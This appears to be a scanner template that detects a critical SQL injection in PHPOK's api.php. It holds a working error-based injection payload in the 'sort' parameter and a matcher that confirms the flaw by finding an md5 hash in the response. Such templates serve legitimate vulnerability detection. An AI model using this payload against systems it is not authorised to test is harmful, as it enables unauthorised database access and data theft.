id: phpok-sqli
brief:
    title: PHPOK - SQL Injection
    by: ritikchaddha
    level: critical
    about: PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operation...
    label:
        - phpok
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+'
      signs:
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
          need: all
